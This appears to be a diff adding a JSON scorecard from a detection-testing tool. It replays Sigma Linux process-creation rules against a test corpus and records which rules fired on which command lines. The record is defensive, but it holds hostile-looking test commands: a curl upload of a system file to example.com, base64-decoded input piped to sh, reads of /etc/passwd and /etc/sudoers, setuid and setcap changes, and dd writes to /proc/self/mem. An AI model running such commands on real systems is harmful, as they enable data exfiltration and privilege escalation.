@@ -1,0 +1,2501 @@
+{
+  "tool": "redgap",
+  "artifact": "rules-scorecard",
+  "mode": "replay",
+  "run_id": "replay",
+  "generated_at": "2026-08-11T00:00:00+00:00",
+  "rules_dir": "tests/corpus/sigmahq_linux_process_creation",
+  "corpus_size": 51,
+  "summary": {
+    "loaded": 122,
+    "excluded": 0,
+    "firing": 34,
+    "silent": 50,
+    "out_of_corpus": 38,
+    "unevaluable": 0,
+    "detected": 33
+  },
+  "rules": [
+    {
+      "id": "00b90cc1-17ec-402c-96ad-3a8117d7a582",
+      "title": "Suspicious Curl File Upload - Linux",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_susp_curl_fileupload.yml",
+      "technique_ids": [
+        "T1567",
+        "T1105"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1105",
+        "T1567"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1567",
+          "event_id": "ev_4516f3d652c3985b",
+          "matched_fields": {
+            "CommandLine": "curl --upload-file /etc/hostname http://example.com/",
+            "Image": "/usr/bin/curl"
+          }
+        }
+      ],
+      "covered_but_not_fired": [
+        "T1105"
+      ],
+      "silent_detail": []
+    },
+    {
+      "id": "0f79c4d2-4e1f-4683-9c36-b5469a665e06",
+      "title": "Access of Sudoers File Content",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_susp_process_reading_sudoers.yml",
+      "technique_ids": [
+        "T1592.004"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1592.004"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1592.004",
+          "event_id": "ev_788965f1b58e698f",
+          "matched_fields": {
+            "CommandLine": "grep root /etc/sudoers",
+            "Image": "/usr/bin/grep"
+          }
+        }
+      ],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "2953194b-e33c-4859-b9e8-05948c167447",
+      "title": "DD File Overwrite",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_dd_file_overwrite.yml",
+      "technique_ids": [
+        "T1485"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1485"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1485",
+          "event_id": "ev_61d0f169d59b6a2b",
+          "matched_fields": {
+            "CommandLine": "dd if=/dev/zero of=/tmp/redgap_wipe bs=1024 count=1",
+            "Image": "/usr/bin/dd"
+          }
+        }
+      ],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "30aed7b6-d2c1-4eaf-9382-b6bc43e50c57",
+      "title": "File Deletion",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_file_deletion.yml",
+      "technique_ids": [
+        "T1070.004"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1070",
+        "T1070.004"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1070.004",
+          "event_id": "ev_0571f71e77ce7aa9",
+          "matched_fields": {
+            "Image": "/usr/bin/rm"
+          }
+        },
+        {
+          "technique_id": "T1070.004",
+          "event_id": "ev_e46877f47f9d4251",
+          "matched_fields": {
+            "Image": "/usr/bin/shred"
+          }
+        }
+      ],
+      "covered_but_not_fired": [
+        "T1070"
+      ],
+      "silent_detail": []
+    },
+    {
+      "id": "312b42b1-bded-4441-8b58-163a3af58775",
+      "title": "Potentially Suspicious Execution From Tmp Folder",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_susp_execution_tmp_folder.yml",
+      "technique_ids": [
+        "T1036"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1036"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1036",
+          "event_id": "ev_690dd76262e88d35",
+          "matched_fields": {
+            "Image": "/tmp/rgmasq"
+          }
+        }
+      ],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "34979410-e4b5-4e5d-8cfb-389fdff05c12",
+      "title": "Remove Immutable File Attribute",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_chattr_immutable_removal.yml",
+      "technique_ids": [
+        "T1222.002"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1222.002"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1222.002",
+          "event_id": "ev_59c8a97cbc4bc1dc",
+          "matched_fields": {
+            "CommandLine": "chattr -i /tmp/redgap_imm",
+            "Image": "/usr/bin/chattr"
+          }
+        }
+      ],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "3f0f5957-04f8-4792-ad89-192b0303bde6",
+      "title": "Python WebServer Execution - Linux",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_python_http_server_execution.yml",
+      "technique_ids": [
+        "T1048.003"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1048.003"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1048.003",
+          "event_id": "ev_6b5c579b5f996180",
+          "matched_fields": {
+            "CommandLine": "python3 -m http.server 8000",
+            "Image": "/usr/bin/python3.13"
+          }
+        }
+      ],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "403ed92c-b7ec-4edd-9947-5b535ee12d46",
+      "title": "Crontab Enumeration",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_crontab_enumeration.yml",
+      "technique_ids": [
+        "T1007"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1007"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1007",
+          "event_id": "ev_e3572ae3a944e1d4",
+          "matched_fields": {
+            "CommandLine": "crontab -l",
+            "Image": "/usr/bin/crontab"
+          }
+        }
+      ],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "42df45e7-e6e9-43b5-8f26-bec5b39cc239",
+      "title": "System Information Discovery",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_system_info_discovery.yml",
+      "technique_ids": [
+        "T1082"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1082"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1082",
+          "event_id": "ev_09a327f36add84c5",
+          "matched_fields": {
+            "Image": "/usr/bin/uname"
+          }
+        }
+      ],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "4c519226-f0cd-4471-bd2f-6fbb2bb68a79",
+      "title": "System Network Connections Discovery - Linux",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_system_network_connections_discovery.yml",
+      "technique_ids": [
+        "T1049"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1049"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1049",
+          "event_id": "ev_4bd196d0c1db405c",
+          "matched_fields": {
+            "Image": "/usr/bin/who"
+          }
+        }
+      ],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "4cad6c64-d6df-42d6-8dae-eb78defdc415",
+      "title": "Potential Linux Process Code Injection Via DD Utility",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_dd_process_injection.yml",
+      "technique_ids": [
+        "T1055.009"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1055.009"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1055.009",
+          "event_id": "ev_929ff87795a996f9",
+          "matched_fields": {
+            "CommandLine": "dd if=/dev/null of=/proc/self/mem",
+            "Image": "/usr/bin/dd"
+          }
+        }
+      ],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "676381a6-15ca-4d73-a9c8-6a22e970b90d",
+      "title": "Local Groups Discovery - Linux",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_local_groups.yml",
+      "technique_ids": [
+        "T1069.001"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1069.001"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1069.001",
+          "event_id": "ev_7f0b30355b0d8a61",
+          "matched_fields": {
+            "Image": "/usr/bin/groups"
+          }
+        }
+      ],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "6b14bac8-3e3a-4324-8109-42f0546a347f",
+      "title": "Scheduled Cron Task/Job - Linux",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_schedule_task_job_cron.yml",
+      "technique_ids": [
+        "T1053.003"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1053.003"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1053.003",
+          "event_id": "ev_83f32ec87b14a037",
+          "matched_fields": {
+            "CommandLine": "crontab /tmp/rgcron",
+            "Image": "/usr/bin/crontab"
+          }
+        }
+      ],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "72f4ab3f-787d-495d-a55d-68c2ff46cf4c",
+      "title": "Connection Proxy",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_proxy_connection.yml",
+      "technique_ids": [
+        "T1090"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1090"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1090",
+          "event_id": "ev_8b3b5064bb7ff2e0",
+          "matched_fields": {
+            "CommandLine": "sh -c env http_proxy=http://127.0.0.1:3128 true"
+          }
+        },
+        {
+          "technique_id": "T1090",
+          "event_id": "ev_c54771db2bd49569",
+          "matched_fields": {
+            "CommandLine": "env http_proxy=http://127.0.0.1:3128 true"
+          }
+        }
+      ],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "86157017-c2b1-4d4a-8c33-93b8e67e4af4",
+      "title": "Potential Suspicious Change To Sensitive/Critical Files",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_susp_sensitive_file_access.yml",
+      "technique_ids": [
+        "T1565.001"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1565.001"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1565.001",
+          "event_id": "ev_4a549658cf1f85a5",
+          "matched_fields": {
+            "CommandLine": "sed -n 1p /etc/hosts",
+            "Image": "/usr/bin/sed"
+          }
+        }
+      ],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "880973f3-9708-491c-a77b-2a35a1921158",
+      "title": "Linux Shell Pipe to Shell",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_susp_pipe_shell.yml",
+      "technique_ids": [
+        "T1140"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1140"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1140",
+          "event_id": "ev_3ec00924b2152c74",
+          "matched_fields": {
+            "CommandLine": "sh -c echo bHM= | base64 -d | sh"
+          }
+        }
+      ],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "8a46f16c-8c4c-82d1-b121-0fdd3ba70a84",
+      "title": "Group Has Been Deleted Via Groupdel",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_groupdel.yml",
+      "technique_ids": [
+        "T1531"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1531"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1531",
+          "event_id": "ev_6877fd5bcdae8a16",
+          "matched_fields": {
+            "Image": "/usr/sbin/groupdel"
+          }
+        },
+        {
+          "technique_id": "T1531",
+          "event_id": "ev_d245f9c21249b42a",
+          "matched_fields": {
+            "Image": "/usr/sbin/groupdel"
+          }
+        }
+      ],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "8c1a5675-cb85-452f-a298-b01b22a51856",
+      "title": "Suspicious Invocation of Shell via AWK - Linux",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_awk_shell_spawn.yml",
+      "technique_ids": [
+        "T1059"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1059"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1059",
+          "event_id": "ev_c4f6ae100c72d98f",
+          "matched_fields": {
+            "CommandLine": "awk BEGIN {system(\"/bin/sh -c id\")}",
+            "Image": "/usr/bin/mawk"
+          }
+        }
+      ],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "95d61234-7f56-465c-6f2d-b562c6fedbc4",
+      "title": "Linux Package Uninstall",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_remove_package.yml",
+      "technique_ids": [
+        "T1070"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1070"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1070",
+          "event_id": "ev_a806b2d702c02092",
+          "matched_fields": {
+            "CommandLine": "dpkg --remove redgap-nonexistent",
+            "Image": "/usr/bin/dpkg"
+          }
+        }
+      ],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "b45e3d6f-42c6-47d8-a478-df6bd6cf534c",
+      "title": "Local System Accounts Discovery - Linux",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_local_account.yml",
+      "technique_ids": [
+        "T1087.001"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1087.001"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1087.001",
+          "event_id": "ev_8cc32953659d6a0f",
+          "matched_fields": {
+            "CommandLine": "cat /etc/passwd",
+            "Image": "/usr/bin/cat"
+          }
+        }
+      ],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "b86d356d-6093-443d-971c-9b07db583c68",
+      "title": "Suspicious Curl Change User Agents - Linux",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_susp_curl_useragent.yml",
+      "technique_ids": [
+        "T1071.001"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1071.001"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1071.001",
+          "event_id": "ev_6508ada44da815fb",
+          "matched_fields": {
+            "CommandLine": "curl -A RedGap/1.0 http://example.com/",
+            "Image": "/usr/bin/curl"
+          }
+        }
+      ],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "ba592c6d-6888-43c3-b8c6-689b8fe47337",
+      "title": "Linux Base64 Encoded Pipe to Shell",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_base64_execution.yml",
+      "technique_ids": [
+        "T1140"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1140"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1140",
+          "event_id": "ev_3ec00924b2152c74",
+          "matched_fields": {
+            "CommandLine": "sh -c echo bHM= | base64 -d | sh"
+          }
+        }
+      ],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "bed978f8-7f3a-432b-82c5-9286a9b3031a",
+      "title": "Shell Invocation via Env Command - Linux",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_env_shell_invocation.yml",
+      "technique_ids": [
+        "T1059.004"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1059",
+        "T1059.004"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1059.004",
+          "event_id": "ev_3602781b2502231d",
+          "matched_fields": {
+            "CommandLine": "env /bin/sh -c id",
+            "Image": "/usr/bin/env"
+          }
+        }
+      ],
+      "covered_but_not_fired": [
+        "T1059"
+      ],
+      "silent_detail": []
+    },
+    {
+      "id": "c172b7b5-f3a1-4af2-90b7-822c63df86cb",
+      "title": "Mask System Power Settings Via Systemctl",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_systemctl_mask_power_settings.yml",
+      "technique_ids": [
+        "T1653"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1653"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1653",
+          "event_id": "ev_34cf682ff64c2727",
+          "matched_fields": {
+            "CommandLine": "systemctl mask hibernate.target",
+            "Image": "/usr/bin/systemctl"
+          }
+        }
+      ],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "c21c4eaa-ba2e-419a-92b2-8371703cbe21",
+      "title": "Setuid and Setgid",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_setgid_setuid.yml",
+      "technique_ids": [
+        "T1548.001"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1548",
+        "T1548.001"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1548.001",
+          "event_id": "ev_9f4b0b9f94ab69fb",
+          "matched_fields": {
+            "CommandLine": "sh -c chown root /tmp/redgap_demo_suid && chmod u+s /tmp/redgap_demo_suid"
+          }
+        },
+        {
+          "technique_id": "T1548.001",
+          "event_id": "ev_d929238d23655c15",
+          "matched_fields": {
+            "CommandLine": "sh -c sh -c 'chown root /tmp/redgap_demo_suid && chmod u+s /tmp/redgap_demo_suid'"
+          }
+        }
+      ],
+      "covered_but_not_fired": [
+        "T1548"
+      ],
+      "silent_detail": []
+    },
+    {
+      "id": "c9d8b7fd-78e4-44fe-88f6-599135d46d60",
+      "title": "Security Software Discovery - Linux",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_security_software_discovery.yml",
+      "technique_ids": [
+        "T1518.001"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1518",
+        "T1518.001"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1518.001",
+          "event_id": "ev_0bf317a70a6d11b5",
+          "matched_fields": {
+            "CommandLine": "grep falcond /etc/passwd",
+            "Image": "/usr/bin/grep"
+          }
+        }
+      ],
+      "covered_but_not_fired": [
+        "T1518"
+      ],
+      "silent_detail": []
+    },
+    {
+      "id": "d2d642d7-b393-43fe-bae4-e81ed5915c4b",
+      "title": "Scheduled Task/Job At",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_at_command.yml",
+      "technique_ids": [
+        "T1053.002"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1053.002"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1053.002",
+          "event_id": "ev_650d17eedb8e45ea",
+          "matched_fields": {
+            "Image": "/usr/bin/at"
+          }
+        },
+        {
+          "technique_id": "T1053.002",
+          "event_id": "ev_91f4866e640fdd6e",
+          "matched_fields": {
+            "Image": "/usr/bin/at"
+          }
+        },
+        {
+          "technique_id": "T1053.002",
+          "event_id": "ev_c8ca9873a92a3388",
+          "matched_fields": {
+            "Image": "/usr/bin/at"
+          }
+        }
+      ],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "d3feb4ee-ff1d-4d3d-bd10-5b28a238cc72",
+      "title": "File and Directory Discovery - Linux",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_file_and_directory_discovery.yml",
+      "technique_ids": [
+        "T1083"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1083"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1083",
+          "event_id": "ev_64ab2d226f495351",
+          "matched_fields": {
+            "Image": "/usr/bin/find"
+          }
+        }
+      ],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "de25eeb8-3655-4643-ac3a-b662d3f26b6b",
+      "title": "Disable Or Stop Services",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_services_stop_and_disable.yml",
+      "technique_ids": [
+        "T1685",
+        "T1489"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1489"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1489",
+          "event_id": "ev_b4140bc0d6b04804",
+          "matched_fields": {
+            "CommandLine": "systemctl stop redgap-nonexistent.service",
+            "Image": "/usr/bin/systemctl"
+          }
+        }
+      ],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "e2072cab-8c9a-459b-b63c-40ae79e27031",
+      "title": "Decode Base64 Encoded Text",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_base64_decode.yml",
+      "technique_ids": [
+        "T1027"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1027"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1027",
+          "event_id": "ev_185ed086e04b4ef4",
+          "matched_fields": {
+            "CommandLine": "base64 -d",
+            "Image": "/usr/bin/base64"
+          }
+        }
+      ],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "e7bd1cfa-b446-4c88-8afb-403bcd79e3fa",
+      "title": "System Network Discovery - Linux",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_system_network_discovery.yml",
+      "technique_ids": [
+        "T1016"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1016"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1016",
+          "event_id": "ev_faea63ac7be5f6ad",
+          "matched_fields": {
+            "CommandLine": "sh -c cat /etc/resolv.conf"
+          }
+        },
+        {
+          "technique_id": "T1016",
+          "event_id": "ev_fd762542db26e662",
+          "matched_fields": {
+            "CommandLine": "cat /etc/resolv.conf"
+          }
+        }
+      ],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "ea34fb97-e2c4-4afb-810f-785e4459b194",
+      "title": "Curl Usage on Linux",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_curl_usage.yml",
+      "technique_ids": [
+        "T1105"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1105"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1105",
+          "event_id": "ev_eb154e42a391cb6a",
+          "matched_fields": {
+            "Image": "/usr/bin/curl"
+          }
+        }
+      ],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "ed447910-bc30-4575-a598-3a2e49516a7a",
+      "title": "Linux Setuid Capability Set on a Binary via Setcap Utility",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_cap_setuid.yml",
+      "technique_ids": [
+        "T1548",
+        "T1554"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1548"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1548",
+          "event_id": "ev_6e20f5e93589a171",
+          "matched_fields": {
+            "CommandLine": "setcap cap_setuid+ep /tmp/rgcap",
+            "Image": "/usr/sbin/setcap"
+          }
+        }
+      ],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "fa4aaed5-4fe0-498d-bbc0-08e3346387ba",
+      "title": "Copy Passwd Or Shadow From TMP Path",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_cp_passwd_or_shadow_tmp.yml",
+      "technique_ids": [
+        "T1552.001"
+      ],
+      "status": "firing",
+      "in_corpus_techniques": [
+        "T1552.001"
+      ],
+      "fired_on": [
+        {
+          "technique_id": "T1552.001",
+          "event_id": "ev_76d0bc088ca8cbee",
+          "matched_fields": {
+            "CommandLine": "cp /tmp/shadow /tmp/shadow.bak",
+            "Image": "/usr/bin/cp"
+          }
+        }
+      ],
+      "covered_but_not_fired": [],
+      "silent_detail": []
+    },
+    {
+      "id": "067d8238-7127-451c-a9ec-fa78045b618b",
+      "title": "Linux Doas Tool Execution",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_doas_execution.yml",
+      "technique_ids": [
+        "T1548"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1548"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1548",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "08f26069-6f80-474b-8d1f-d971c6fedea0",
+      "title": "User Has Been Deleted Via Userdel",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_userdel.yml",
+      "technique_ids": [
+        "T1531"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1531"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1531",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "093d68c7-762a-42f4-9f46-95e79142571a",
+      "title": "Shell Execution via Nice - Linux",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_nice_shell_execution.yml",
+      "technique_ids": [
+        "T1083"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1083"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1083",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "0cf7a157-8879-41a2-8f55-388dd23746b7",
+      "title": "Linux Recon Indicators",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_susp_recon_indicators.yml",
+      "technique_ids": [
+        "T1592.004",
+        "T1552.001"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1552.001",
+        "T1592.004"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1552.001",
+          "telemetry_present": true
+        },
+        {
+          "technique_id": "T1592.004",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "11701de9-d5a5-44aa-8238-84252f131895",
+      "title": "Docker Container Discovery Via Dockerenv Listing",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_susp_dockerenv_recon.yml",
+      "technique_ids": [
+        "T1082"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1082"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1082",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "1182f3b3-e716-4efa-99ab-d2685d04360f",
+      "title": "History File Deletion",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_susp_history_delete.yml",
+      "technique_ids": [
+        "T1565.001"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1565.001"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1565.001",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "297241f3-8108-4b3a-8c15-2dda9f844594",
+      "title": "Suspicious Invocation of Shell via Rsync",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_rsync_shell_spawn.yml",
+      "technique_ids": [
+        "T1059",
+        "T1203"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1059"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1059",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "2992ac4d-31e9-4325-99f2-b18a73221bb2",
+      "title": "ESXi VM Kill Via ESXCLI",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_esxcli_vm_kill.yml",
+      "technique_ids": [
+        "T1059.012",
+        "T1529"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1059"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1059",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "2d2f44ff-4611-4778-a8fc-323a0e9850cc",
+      "title": "Inline Python Execution - Spawn Shell Via OS System Library",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_python_shell_os_system.yml",
+      "technique_ids": [
+        "T1059"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1059"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1059",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "31545105-3444-4584-bebf-c466353230d2",
+      "title": "Touch Suspicious Service File",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_touch_susp.yml",
+      "technique_ids": [
+        "T1070.006"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1070",
+        "T1070.006"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1070",
+          "telemetry_present": true
+        },
+        {
+          "technique_id": "T1070.006",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "33e814e0-1f00-4e43-9c34-31fb7ae2b174",
+      "title": "ESXi Network Configuration Discovery Via ESXCLI",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_esxcli_network_discovery.yml",
+      "technique_ids": [
+        "T1033",
+        "T1007",
+        "T1059.012"
+      ],
+      "status": "silent",
+      "in_corpus_techniques": [
+        "T1007",
+        "T1033",
+        "T1059"
+      ],
+      "fired_on": [],
+      "covered_but_not_fired": [],
+      "silent_detail": [
+        {
+          "technique_id": "T1007",
+          "telemetry_present": true
+        },
+        {
+          "technique_id": "T1033",
+          "telemetry_present": true
+        },
+        {
+          "technique_id": "T1059",
+          "telemetry_present": true
+        }
+      ]
+    },
+    {
+      "id": "38eb1dbb-011f-40b1-a126-cf03a0210563",
+      "title": "ESXi Syslog Configuration Change Via ESXCLI",
+      "path": "tests/corpus/sigmahq_linux_process_creation/proc_creation_lnx_esxcli_syslog_config_change.yml",
+      "technique_ids": [
+        "T1685",
+        "T1690",
+        "T1059.012"
+      ],
+      "status": "silent",
